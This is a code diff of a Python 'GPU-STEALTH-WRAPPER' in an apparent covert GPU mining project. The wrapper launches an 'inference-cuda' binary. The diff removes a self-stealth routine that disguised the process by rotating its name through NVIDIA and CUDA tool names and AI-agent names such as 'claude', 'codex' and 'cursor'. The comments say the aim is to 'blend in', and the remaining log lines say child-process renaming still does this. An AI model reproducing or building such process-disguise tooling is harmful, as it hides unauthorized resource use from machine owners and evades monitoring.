@@ -39,9 +39,8 @@ from pathlib import Path
 project_root = Path(__file__).parent.parent.parent.parent
 sys.path.insert(0, str(project_root))
 
-# Import self-stealth module (updated path)
+# Import required modules
 try:
-    from mining_environment.stealth.core.self_stealth import start_self_stealth, SelfStealthManager
     from mining_environment.scripts.unified_logging import get_unified_logger
 except ImportError as e:
     print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
@@ -56,13 +55,8 @@ def signal_handler(signum, frame):
     """
     logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
     
-    # Get global stealth manager if exists
-    from mining_environment.stealth.core.self_stealth import get_global_stealth_manager
-    stealth_manager = get_global_stealth_manager()
-    
-    if stealth_manager:
-        stealth_manager.stop_stealth_mode()
-        logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleaned up")
+    # Self-stealth functionality removed - no cleanup needed
+    logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleanup completed")
     
     sys.exit(0)
 
@@ -148,50 +142,11 @@ def main():
         
         logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")
         
-        # Start self-stealth mode với GPU-optimized names
-        # Sử dụng GPU/graphics-related process names để blend in
-        stealth_manager = start_self_stealth(
-            rotation_interval=25,  # Slightly different từ CPU để avoid pattern
-            custom_names=[
-                "nvidiasmi",           # NVIDIA System Management Interface
-                "cudagdb",             # CUDA Debugger
-                "nvcc",                # NVIDIA CUDA Compiler
-                "nvidiamlpy",          # NVIDIA ML Python
-                "nvidiasettings",      # NVIDIA Settings
-                "gpumanager",          # GPU Manager
-                "glxgears",            # OpenGL test utility
-                "vulkaninfo",          # Vulkan system info
-                "mesaloader",          # Mesa graphics loader
-                "drmtip",              # Direct Rendering Manager
-                "tensorcore",          # NVIDIA Tensor core utility
-                "cudadrvr",            # CUDA driver helper
-                "nvcompiler",          # NV compiler service
-                "openclwkr",           # OpenCL worker thread
-                "cudnnhelp",           # cuDNN helper
-                "nvrmdaemon",          # NVIDIA RM daemon
-                "gpusched",            # GPU scheduler service
-                "cudaipc",             # CUDA IPC handler
-                "claude", "codex", "code", "openai", 
-                "cursor", "agents", "windsurf"
-            ]
-        )
+        # Self-stealth functionality removed - process renaming now handled by child process management
+        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")
         
-        # Set global manager để signal handler có thể access
-        from mining_environment.stealth.core.self_stealth import set_global_stealth_manager
-        set_global_stealth_manager(stealth_manager)
-        
-        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode activated")
-        
-        # Log stealth status
-        status = stealth_manager.get_status()
-        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] Stealth status: {status}")
-        
-        # **CRITICAL**: Small delay để đảm bảo stealth mode hoàn toàn active
-        time.sleep(2)
-        
-        # Verify stealth name change
-        current_name = stealth_manager.get_current_process_name()
-        logger.info(f"✅ [GPU-STEALTH-WRAPPER] GPU process name changed to: '{current_name}'")
+        # Small delay để đảm bảo process ready
+        time.sleep(1)
         
         # Prepare command để exec inference-cuda
         exec_command = [cuda_inference_path] + cuda_inference_args
